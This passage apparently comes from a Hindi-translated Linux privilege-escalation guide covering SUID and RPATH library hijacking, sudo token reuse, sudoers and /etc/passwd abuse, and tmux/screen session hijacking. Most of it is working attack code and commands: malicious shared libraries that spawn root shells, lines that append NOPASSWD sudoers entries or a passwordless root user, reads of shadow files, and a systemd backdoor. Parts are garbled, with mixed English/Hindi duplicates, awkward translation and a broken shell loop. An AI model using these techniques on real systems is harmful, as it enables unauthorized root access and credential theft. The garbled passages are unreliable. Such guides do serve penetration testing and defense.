अब जब हमें एक SUID बाइनरी मिल गया है जो एक फ़ोल्डर से एक पुस्तकालय लोड कर रहा है जहां हम लिख सकते हैं, तो उस फ़ोल्डर में आवश्यक नाम के साथ पुस्तकालय बनाएं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसी त्रुटि मिलती है जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
इसका मतलब है कि आपके द्वारा उत्पन्न की गई पुस्तकालय में `a_function_name` नामक एक फ़ंक्शन होना चाहिए।

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक संग्रहीत सूची है जिसमें Unix बाइनरी की विधि संशोधित की गई है जिसका उपयोग हमलावर द्वारा स्थानीय सुरक्षा प्रतिबंधों को दौर करने के लिए किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) इसी का एक संस्करण है, लेकिन ऐसे मामलों के लिए जहां आप केवल एक कमांड में तर्क डाल सकते हैं।

यह परियोजना Unix बाइनरी के वैध फ़ंक्शनों को एकत्रित करती है जिनका दुरुपयोग किया जा सकता है ताकि प्रतिबंधित शेल को तोड़ा जा सके, उच्चाधिकार को बढ़ावा दिया जा सके, फ़ाइलें स्थानांतरित की जा सकें, बाइंड और रिवर्स शेल उत्पन्न की जा सकें, और अन्य पोस्ट-उत्पन्न कार्यों को सुविधाजनक बनाने में सहायता करें।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

यदि आप `sudo -l` तक पहुंच सकते हैं, तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग करके यह जांच सकते हैं कि क्या यह किसी सुदो नियम को उत्पन्न करने के लिए कैसे उपयोग कर सकता है।

### Sudo टोकन का पुनः उपयोग करना

जब आपके पास **एक उपयोगकर्ता के रूप में सुदो अधिकार** वाली शेल होती है, लेकिन आप उपयोगकर्ता का पासवर्ड नहीं जानते हैं, तो आप **उसे `sudo` के द्वारा कुछ कमांड निष्पादित करने के लिए प्रतीक्षा कर सकते हैं**। फिर, आप **sudo का उपयोग करने के लिए उपयोग किए गए सत्र के टोकन तक पहुंच सकते हैं और किसी भी कार्य को sudo के रूप में निष्पादित करने के लिए उपयोग कर सकते हैं** (उच्चाधिकार का विस्तार)।

उच्चाधिकार प्राप्त करने के लिए आवश्यकताएं:

* आप पहले से ही उपयोगकर्ता "_नमूना उपयोगकर्ता_" के रूप में एक शेल रखते हैं
* "_नमूना उपयोगकर्ता_" ने **`sudo` का उपयोग** करके कुछ **पिछले 15 मिनटों** में कुछ निष्पादित किया है (डिफ़ॉल्ट रूप में यही समयांतर है जो हमें किसी भी पासवर्ड को दर्ज किए बिना `sudo` का उपयोग करने की अनुमति देता है)
* `cat /proc/sys/kernel/yama/ptrace_scope` 0 है
* `gdb` उपयोग योग्य है (आप इसे अपलोड कर सकते हैं)

(आप `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ `ptrace_scope` को अस्थायी रूप से सक्षम कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` को स्थायी रूप से संशोधित करके `kernel.yama.ptrace_scope = 0` सेट कर सकते हैं)

यदि ये सभी आवश्यकताएं पूरी होती हैं, तो आप निम्नलिखित का उपयोग करके उच्चाधिकार प्राप्त कर सकते हैं: [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **पहला उत्पाद** (`exploit.sh`) _/tmp_ में `activate_sudo_token` बाइनरी बनाएगा। आप इसे उपयोग करके अपने सत्र में sudo टोकन को **सक्रिय कर सकते हैं** (आपको स्वचालित रूप से रूट शेल नहीं मिलेगी, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
*दूसरा उत्पादन** (`exploit_v2.sh`) _/tmp_ में एक शेल शेल बनाएगा जिसके मालिक root होगा और setuid होगा।*
```bash
bash exploit_v2.sh
/tmp/sh -p
```
*दूसरा उत्पादन* (`exploit_v3.sh`) **एक sudoers फ़ाइल बनाएगा** जो **sudo टोकन को अनन्त बनाएगा और सभी उपयोगकर्ताओं को sudo का उपयोग करने देगा।*
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल में **लिखने की अनुमति** है, तो आप [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) बाइनरी का उपयोग करके **उपयोगकर्ता और PID के लिए एक सुदो टोकन बना सकते हैं**।\
उदाहरण के लिए, यदि आप _/var/run/sudo/ts/sampleuser_ फ़ाइल को अधिलेखित कर सकते हैं और आपके पास उस उपयोगकर्ता के रूप में PID 1234 के साथ एक शेल है, तो आप **पासवर्ड जानने की आवश्यकता नहीं होती है** करके सुदो विशेषाधिकार प्राप्त कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` फ़ाइलें `sudo` का उपयोग कर सकने वालों और उनके तरीके को कैसे कॉन्फ़िगर करती हैं। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल यूज़र रूट और ग्रुप रूट द्वारा पढ़ी जा सकती हैं**।\
यदि आप इस फ़ाइल को **पढ़ सकते हैं**, तो आपको कुछ **दिलचस्प जानकारी प्राप्त करने** की क्षमता हो सकती है, और यदि आप किसी भी फ़ाइल को **लिख सकते हैं**, तो आपको **वृद्धि अधिकार प्राप्त करने** की क्षमता होगी।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन अनुमतियों का दुरुपयोग करने का एक और तरीका है:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के लिए `doas` जैसे कुछ विकल्प हैं, जैसे कि OpenBSD के लिए, `/etc/doas.conf` पर इसकी कॉन्फ़िगरेशन की जांच करना न भूलें।
```
permit nopass demo as root cmd vim
```
### सुडो हाइजैकिंग

यदि आप जानते हैं कि एक **उपयोगकर्ता आमतौर पर एक मशीन से कनेक्ट करता है और `sudo` का उपयोग करके विशेषाधिकारों को बढ़ाता है** और आपके पास उस उपयोगकर्ता संदर्भ में एक शैल मिल गया है, तो आप **एक नया sudo निष्पादनकर्ता बना सकते हैं** जो आपके कोड को रूट के रूप में और फिर उपयोगकर्ता के कमांड के रूप में निष्पादित करेगा। फिर, उपयोगकर्ता संदर्भ में $PATH को संशोधित करें (उदाहरण के लिए .bash\_profile में नया पथ जोड़ें) ताकि जब उपयोगकर्ता sudo का उपयोग करता है, आपका sudo निष्पादनकर्ता निष्पादित होता है।

ध्यान दें कि यदि उपयोगकर्ता एक अलग शैल (बैश नहीं) का उपयोग करता है, तो आपको नए पथ जोड़ने के लिए अन्य फ़ाइलों को संशोधित करने की आवश्यकता होगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) में एक और उदाहरण ढूंढ सकते हैं।

## साझा पुस्तकालय

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दिखाती है कि **लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहां से हैं**। आमतौर पर, इस फ़ाइल में निम्नलिखित पथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका अर्थ है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएंगी। इस कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डर्स** की ओर **पुस्तकालयों** की **खोज की जाएगी**। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका अर्थ है कि सिस्टम `/usr/local/lib` के अंदर पुस्तकालयों की खोज करेगा**।

यदि किसी कारण से **किसी उपयोगकर्ता को किसी भी पथ पर लिखने की अनुमति है** जैसे कि `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर की कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` के अंदर की कॉन्फ़िगरेशन फ़ाइल के अंदर का कोई भी फ़ोल्डर, तो उसे विशेषाधिकारों को बढ़ाने की संभावना हो सकती है।\
निम्नलिखित पृष्ठ में इस गलत कॉन्फ़िगरेशन का शोध कैसे करें की जांच करें:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`RPATH` चर के रूप में इस स्थान में प्रोग्राम द्वारा उपयोग के लिए `/var/tmp/flag15/` में लिब्रेरी की प्रतिलिपि करके इस्तेमाल की जाएगी।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
तो `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` के साथ एक दुष्ट पुस्तकालय बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएं

Linux क्षमताएं प्रक्रिया को उपलब्ध रूट विशेषाधिकारों का एक उपसमूह प्रदान करती है। यह वास्तव में रूट विशेषाधिकारों को छोटे और विशिष्ट इकाइयों में विभाजित करता है। इन इकाइयों में से प्रत्येक को अलग-अलग प्रक्रियाओं को स्वतंत्र रूप से प्रदान किया जा सकता है। इस तरीके से पूरी क्षमताओं का सेट कम हो जाता है, जिससे उत्पादन के जोखिम को कम किया जाता है।\
क्षमताओं के बारे में और उन्हें कैसे दुरुपयोग किया जा सकता है, इसके बारे में अधिक जानने के लिए निम्नलिखित पृष्ठ को पढ़ें:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## निर्देशिका अनुमतियाँ

एक निर्देशिका में, "चलाने" के लिए बिट यह दर्शाता है कि प्रभावित उपयोगकर्ता फ़ोल्डर में "cd" कर सकता है।\
"पढ़ने" बिट उपयोगकर्ता को फ़ाइलों की सूची बना सकता है, और "लिखने" बिट उपयोगकर्ता को फ़ाइलों को हटाने और नई फ़ाइलें बनाने की अनुमति देता है।

## ACLs

ACLs (Access Control Lists) विवेकाधीन अनुमतियों के दूसरे स्तर हैं, जो मानक ugo/rwx अनुमतियों को अधिरोहित कर सकते हैं। सही ढंग से उपयोग किए जाने पर वे आपको एक फ़ाइल या निर्देशिका के लिए पहुंच सेट करने में बेहतर विस्तारण प्रदान कर सकते हैं, उदाहरण के लिए एक विशेष उपयोगकर्ता को पहुंच देने या इनकार करने के द्वारा जो न तो फ़ाइल के मालिक है और न ही समूह के मालिक है (यहां से)।\
उपयोगकर्ता "kali" को एक फ़ाइल पर पढ़ने और लिखने की अनुमति दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से** विशिष्ट ACL वाले फ़ाइलें प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुली शैल सत्र

**पुराने संस्करणों** में आप किसी अलग उपयोगकर्ता (**रूट**) के कुछ शैल सत्र को **हाइजैक** कर सकते हैं।\
**नवीनतम संस्करणों** में आप केवल अपने ही उपयोगकर्ता के स्क्रीन सत्रों से **कनेक्ट** हो सकेंगे। हालांकि, आप सत्र के अंदर **रोचक जानकारी खोज सकते हैं**।

### स्क्रीन सत्रों की हाइजैकिंग

**स्क्रीन सत्रों की सूची बनाएं**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**एक सत्र में संलग्न करें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux सेशन हाइजैकिंग

यह पुराने tmux संस्करणों की समस्या थी। मैं एक गैर-विशेषाधिकारी उपयोगकर्ता के रूप में रूट द्वारा बनाए गए tmux (v2.1) सेशन को हाइजैक नहीं कर सका।

**tmux सेशनों की सूची**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**एक सत्र में संलग्न करें**

To attach to a session, use the following command:

सत्र में संलग्न होने के लिए, निम्नलिखित कमांड का उपयोग करें:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` को उस सत्र के नाम से बदलें जिसे आप संलग्न करना चाहते हैं।

If you are unsure about the available sessions, you can list them using the following command:

यदि आप उपलब्ध सत्रों के बारे में अनिश्चित हैं, तो आप निम्नलिखित कमांड का उपयोग करके उन्हें सूचीबद्ध कर सकते हैं:

```bash
tmux list-sessions
```

This will display a list of all the active sessions.

इससे सभी सक्रिय सत्रों की सूची प्रदर्शित होगी।
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
एचटीबी के वेलेंटाइन बॉक्स के लिए एक उदाहरण के लिए देखें।

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

सितंबर 2006 से मई 13, 2008 तक के बीच डेबियन आधारित सिस्टमों (उबंटू, कुबंटू, आदि) पर जेनरेट की गई सभी SSL और SSH कुंजीयों पर इस बग का प्रभाव हो सकता है।\
यह बग उस समय उत्पन्न होता है जब इन ऑपरेटिंग सिस्टम में एक नई SSH कुंजी बनाई जाती है, क्योंकि इसमें केवल **32,768 विभिन्नताएं संभव थीं**। इसका मतलब है कि सभी संभावनाएं गणना की जा सकती है और **SSH सार्वजनिक कुंजी के साथ आप उसके संबंधित निजी कुंजी की खोज कर सकते हैं**। आप यहां गणना की गई संभावनाएं देख सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH दिलचस्प समाकृति मान

* **PasswordAuthentication:** पासवर्ड प्रमाणीकरण की अनुमति है या नहीं यह निर्धारित करता है। डिफ़ॉल्ट रूप से `नहीं` है।
* **PubkeyAuthentication:** सार्वजनिक कुंजी प्रमाणीकरण की अनुमति है या नहीं यह निर्धारित करता है। डिफ़ॉल्ट रूप से `हाँ` है।
* **PermitEmptyPasswords**: पासवर्ड प्रमाणीकरण की अनुमति होने पर, यह निर्धारित करता है कि सर्वर खाली पासवर्ड स्ट्रिंग वाले खातों में लॉगिन की अनुमति देता है या नहीं। डिफ़ॉल्ट रूप से `नहीं` है।

### PermitRootLogin

यह निर्दिष्ट करता है कि क्या रूट ssh का उपयोग करके लॉगिन कर सकता है, डिफ़ॉल्ट रूप से `नहीं` है। संभावित मान:

* `हाँ`: रूट पासवर्ड और निजी कुंजी का उपयोग करके लॉगिन कर सकता है
* `without-password` या `prohibit-password`: रूट केवल निजी कुंजी के साथ ही लॉगिन कर सकता है
* `forced-commands-only`: रूट केवल निजी कुंजी का उपयोग करके और यदि आपत्तियों के विकल्प निर्दिष्ट किए गए हों, तो लॉगिन कर सकता है
* `नहीं`: नहीं

### AuthorizedKeysFile

उपयोगकर्ता प्रमाणीकरण के लिए उपयोग किए जा सकने वाली सार्वजनिक कुंजी वाले फ़ाइलें निर्दिष्ट करती हैं। इसमें `%h` जैसे टोकन शामिल हो सकते हैं, जो घर के निर्देशिका द्वारा प्रतिस्थापित किए जाएंगे। **आप सटीक पथों की संकेत कर सकते हैं** (जो `/` से प्रारंभ होते हैं) या **उपयोगकर्ता के घर से संबंधित पथ**। उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह कॉन्फ़िगरेशन यह दर्शाएगी कि यदि आप "**testusername**" उपयोगकर्ता की **निजी** कुंजी के साथ लॉगिन करने का प्रयास करते हैं, तो ssh आपकी कुंजी की सार्वजनिक कुंजी को `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में स्थित कुंजी के साथ तुलना करेगा।

### ForwardAgent/AllowAgentForwarding

SSH एजेंट फ़ॉरवर्डिंग आपको अपनी स्थानीय SSH कुंजियों का उपयोग करने की अनुमति देता है इससे आपको अपने सर्वर पर छोड़ दिए गए कुंजियों (बिना पासवर्ड के!) का उपयोग करने की आवश्यकता नहीं होगी। इसलिए, आप ssh के माध्यम से एक होस्ट पर **जंप** करने और वहां से एक और होस्ट पर **जंप** करने के लिए अपनी **प्रारंभिक होस्ट** में स्थित **कुंजी** का उपयोग कर सकेंगे।

आपको इस विकल्प को `$HOME/.ssh.config` में इस तरह सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब उपयोगकर्ता एक अलग मशीन पर जाता है, तो उस मशीन को कुंजियों तक पहुंच होगी (जो एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस **विकल्प** को **ओवरराइड** कर सकती है और इस कॉन्फ़िगरेशन को अनुमति देने या निषेधित कर सकती है।
फ़ाइल `/etc/sshd_config` `AllowAgentForwarding` शब्द के साथ ssh-agent forwarding को **अनुमति देती है** या **निषेधित करती है** (डिफ़ॉल्ट अनुमति है)।

यदि आपको पता चलता है कि Forward Agent कॉन्फ़िगर किया गया है तो निम्नलिखित पृष्ठ को पढ़ें क्योंकि **आप विशेषाधिकारों को बढ़ाने के लिए इसका दुरुपयोग कर सकते हैं**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## दिलचस्प फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के नीचे की फ़ाइलें **स्क्रिप्ट हैं जो जब उपयोगकर्ता एक नई शैली चलाता है तो क्रियान्वयन होती हैं**। इसलिए, यदि आप **इनमें से किसी भी एक को लिख सकते हैं या संशोधित कर सकते हैं तो आप विशेषाधिकारों को बढ़ा सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलता है, तो आपको इसे **संवेदनशील विवरणों** के लिए जांचना चाहिए।

### पासवर्ड/शैडो फ़ाइलें

आपके आधार पर ऑपरेटिंग सिस्टम के अनुसार `/etc/passwd` और `/etc/shadow` फ़ाइलें एक अलग नाम का उपयोग कर सकती हैं या उनका बैकअप हो सकता है। इसलिए यह सुझाव दिया जाता है कि आप **उन सभी को खोजें** और देखें कि क्या आप उन्हें पढ़ सकते हैं ताकि आप देख सकें कि क्या फ़ाइलों में **हैश** हैं:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मौकों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल में **पासवर्ड हैश** ढूंढ सकते हैं।
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

पहले, निम्नलिखित कमांडों में से किसी एक के साथ एक पासवर्ड उत्पन्न करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
तब `hacker` उपयोगकर्ता को जोड़ें और उत्पन्न पासवर्ड जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदा: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

आप अब `su` कमांड का उपयोग कर सकते हैं `hacker:hacker` के साथ

वैकल्पिक रूप से, आप निम्नलिखित पंक्तियों का उपयोग करके एक डमी उपयोगकर्ता बिना पासवर्ड जोड़ सकते हैं।
चेतावनी: आप मशीन की वर्तमान सुरक्षा को कम कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफॉर्म में `/etc/passwd` को `/etc/pwd.db` और `/etc/master.passwd` में स्थानांतरित किया जाता है, इसके अलावा `/etc/shadow` को `/etc/spwd.db` में नामांकित किया जाता है।

आपको यह जांचना चाहिए कि क्या आप कुछ **संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन पर एक **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat सेवा कॉन्फ़िगरेशन फ़ाइल को संशोधित कर सकते हैं,** तो आप लाइनों को संशोधित कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका बैकडोर अगली बार जब टॉमकैट शुरू होगा, वह चलाया जाएगा।

### फ़ोल्डर जांचें

निम्नलिखित फ़ोल्डर बैकअप या दिलचस्प जानकारी समेत कर सकते हैं: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आखिरी वाला पढ़ नहीं पाएंगे, लेकिन कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/स्वामित्व वाली फ़ाइलें

जब हम एक लिनक्स सिस्टम पर अधिकार बढ़ाने की कोशिश करते हैं, तो हमें अजीब स्थानों और स्वामित्व वाली फ़ाइलों की जांच करनी चाहिए। ये फ़ाइलें आमतौर पर उपयोगकर्ता द्वारा नहीं बनाई जाती हैं और इसलिए इन्हें ध्यान से जांचना चाहिए। इन फ़ाइलों के माध्यम से हम अपने अधिकारों को बढ़ा सकते हैं या अन्य तकनीकों का उपयोग करके अनुमतियाँ प्राप्त कर सकते हैं।

यहां कुछ अजीब स्थानों और स्वामित्व वाली फ़ाइलों की सूची है:

- `/tmp` और `/var/tmp` फ़ोल्डर: ये फ़ोल्डर अक्सर अनुमतियों के साथ सेट होते हैं और इनमें अजीब फ़ाइलें हो सकती हैं।
- `/dev/shm` फ़ोल्डर: यह फ़ोल्डर अक्सर अनुमतियों के साथ सेट होता है और इसमें अजीब फ़ाइलें हो सकती हैं।
- `/var/backups` फ़ोल्डर: यह फ़ोल्डर बैकअप फ़ाइलों के लिए उपयोग होता है और इसमें स्वामित्व वाली फ़ाइलें हो सकती हैं।
- `/var/lib/docker` फ़ोल्डर: यदि आपके सिस्टम पर डॉकर सेटअप है, तो इस फ़ोल्डर में अजीब फ़ाइलें हो सकती हैं।
- `/var/lib/mysql` फ़ोल्डर: यदि आपके सिस्टम पर MySQL सेटअप है, तो इस फ़ोल्डर में स्वामित्व वाली फ़ाइलें हो सकती हैं।
- `/var/lib/postgresql` फ़ोल्डर: यदि आपके सिस्टम पर PostgreSQL सेटअप है, तो इस फ़ोल्डर में स्वामित्व वाली फ़ाइलें हो सकती हैं।
- `/var/lib/mongodb` फ़ोल्डर: यदि आपके सिस्टम पर MongoDB सेटअप है, तो इस फ़ोल्डर में स्वामित्व वाली फ़ाइलें हो सकती हैं।

इन फ़ाइलों को जांचने के लिए, हमें उनके स्वामित्व को जांचने के लिए निम्नलिखित कमांड का उपयोग करना चाहिए:

```bash
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm
ls -la /var/backups
ls -la /var/lib/docker
ls -la /var/lib/mysql
ls -la /var/lib/postgresql
ls -la /var/lib/mongodb
```

इसके अलावा, हमें इन फ़ाइलों के साथ जुड़े अनुमतियों की जांच भी करनी चाहिए। इसके लिए, हमें निम्नलिखित कमांड का उपयोग करना चाहिए:

```bash
find /tmp -perm -u=s -type f 2>/dev/null
find /var/tmp -perm -u=s -type f 2>/dev/null
find /dev/shm -perm -u=s -type f 2>/dev/null
find /var/backups -perm -u=s -type f 2>/dev/null
find /var/lib/docker -perm -u=s -type f 2>/dev/null
find /var/lib/mysql -perm -u=s -type f 2>/dev/null
find /var/lib/postgresql -perm -u=s -type f 2>/dev/null
find /var/lib/mongodb -perm -u=s -type f 2>/dev/null
```

यदि हमें किसी अजीब फ़ाइल या अनुमति मिलती है, तो हम उसे अपने लाभ के लिए उपयोग कर सकते हैं और अधिकारों को बढ़ा सकते हैं।
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले मिनटों में संशोधित फ़ाइलें

To identify the modified files in the last few minutes, you can use the following command:

```bash
find / -type f -mmin -5
```

This command will search for all files (`-type f`) in the entire system (`/`) that have been modified within the last 5 minutes (`-mmin -5`). Adjust the value after `-mmin` to specify the desired time frame.

Keep in mind that this command may take some time to complete, as it searches the entire system. Additionally, you may need root privileges to access certain directories.
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite डीबी फ़ाइलें

Sqlite एक लाइटवेट डेटाबेस इंजन है जिसे आमतौर पर एम्बेडेड सिस्टम्स में उपयोग किया जाता है। यह एक सिंगल-यूजर, जटिलता कम और ट्रांजैक्शनल डेटाबेस है जिसे आसानी से इंटरफ़ेस किया जा सकता है। Sqlite डेटाबेस फ़ाइलें एक या एक से अधिक टेबल का संग्रह होती हैं, जिनमें डेटा संग्रहीत किया जाता है।

Sqlite डेटाबेस फ़ाइलें `.db` या `.sqlite` नामक फ़ाइल एक्सटेंशन के साथ संग्रहीत होती हैं। इन फ़ाइलों को आमतौर पर एप्लिकेशन डेटा, कॉन्फ़िगरेशन डेटा, उपयोगकर्ता डेटा और अन्य संबंधित डेटा को संग्रहीत करने के लिए उपयोग किया जाता है।

Sqlite डेटाबेस फ़ाइलें अक्सर एप्लिकेशन इंस्टॉलेशन डायरेक्टरी में स्थित होती हैं और उन्हें उपयोगकर्ता द्वारा एक्सेस किया जा सकता है। इन फ़ाइलों को अनधिकृत रूप से एक्सेस करके, आप उनमें संग्रहित डेटा को पढ़ और संपादित कर सकते हैं, जो अनधिकृत उपयोगकर्ताओं के लिए एक बड़ी सुरक्षा समस्या हो सकती है।

ध्यान दें कि Sqlite डेटाबेस फ़ाइलें आमतौर पर बाइनरी फ़ाइलें होती हैं, इसलिए उन्हें सीधे पढ़ने के लिए एक टेक्स्ट एडिटर का उपयोग नहीं किया जा सकता है। इन फ़ाइलों को पढ़ने और संपादित करने के लिए, आपको Sqlite डेटाबेस इंजन का उपयोग करना होगा जो आपको डेटाबेस क्वेरी का उपयोग करके डेटा एक्सेस करने की अनुमति देता है।
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
